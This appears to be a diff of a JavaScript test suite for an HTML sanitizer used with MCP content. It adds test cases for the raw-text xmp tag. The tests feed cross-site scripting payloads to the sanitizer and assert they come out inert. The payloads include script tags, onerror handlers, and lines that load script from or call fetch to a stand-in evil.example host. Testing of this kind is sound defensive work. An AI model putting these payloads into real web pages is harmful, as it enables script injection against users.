@@ -25,6 +25,10 @@ describe('MCP HTML sanitizer', () => {
         // that a lenient tag regex does not match but a browser parses as a normal tag with
         // attributes. Both emitted attacker markup verbatim before this used a real sanitizer.
         expectInert('<pre><script>alert(1)</script></pre>', 'pre raw text');
+        // htmlparser2 treats xmp as raw text as well, so dropping the tag alone would hand the
+        // caller the attacker's own markup back as text
+        expect(webSafeHtml('<xmp><script>alert(1)</script></xmp>')).to.equal('');
+        expectInert('<xmp><img src=x onerror=alert(1)></xmp>', 'xmp raw text');
         expectInert('<PRE><script src="https://evil.example/x.js"></script></PRE>', 'uppercase pre');
         expectInert('<pre><img src=x onerror="fetch(\'https://evil.example\')"></pre>', 'pre with handler');
         expectInert('<img/src=x onerror=alert(1)>', 'slash delimited tag');
